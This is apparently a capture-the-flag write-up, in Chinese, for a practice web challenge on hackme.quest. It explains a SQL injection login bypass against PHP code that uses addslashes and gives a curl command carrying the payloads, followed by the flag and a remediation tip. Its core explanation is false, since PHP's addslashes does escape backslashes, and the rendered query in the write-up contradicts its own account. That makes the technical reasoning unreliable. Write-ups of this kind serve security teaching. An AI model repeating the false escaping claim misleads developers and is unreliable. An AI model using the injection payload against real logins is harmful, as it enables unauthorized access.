# PHM #21 Web — login as admin 0

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 20 |

## 題目

> Try to login as admin!
>
> 連結: [`/login0/`](https://ctf.hackme.quest/login0/)

## 分析

`?show_source=1` 看 source:

```php
$name = addslashes($_POST['name']);
$password = addslashes($_POST['password']);
$sql = "SELECT * FROM `users` WHERE `name` = '$name' AND `password` = '$password'";
```

`addslashes` 跳脫 `'` 為 `\'`, 看似安全. 但**沒跳脫 `\`**: 送 `name=admin\` → `'admin\'` 的 `\'` 把閉合引號吃掉, string 繼續吃到下一個 `'` (password 的開引號), 於是整段變成:

```sql
WHERE `name` = 'admin\\' AND `password` = '<pwd>'
                                           ^ 其實這是 name 值的真正結束
```

name 真正的字串是 `admin' AND \`password\` = `. 然後 password 位置開始塞 SQL.

## 解法

```bash
curl 'https://ctf.hackme.quest/login0/' \
  --data-urlencode 'name=admin\' \
  --data-urlencode 'password=OR is_admin#'
```

即:
- name = `admin\`  (把後面 `'` 吃掉)
- password = `OR is_admin#` (前面接著 `'<pwd>` 變 `'OR is_admin#'`, 整段變 `WHERE 'admin\\' AND \`password\` =' OR is_admin#'`, 等於 `WHERE <string> OR is_admin`)

## Flag

```
FLAG{\' UNION SELECT "I Know SQL Injection" #}
```

## 感想

`addslashes` **不會跳脫 backslash 本身**, 這是 PHP 90% SQLi 教學會提到的經典坑. 修法: 用 PDO parameterized query, 或 `mysqli_real_escape_string` (但後者仍可能被 charset 攻擊).
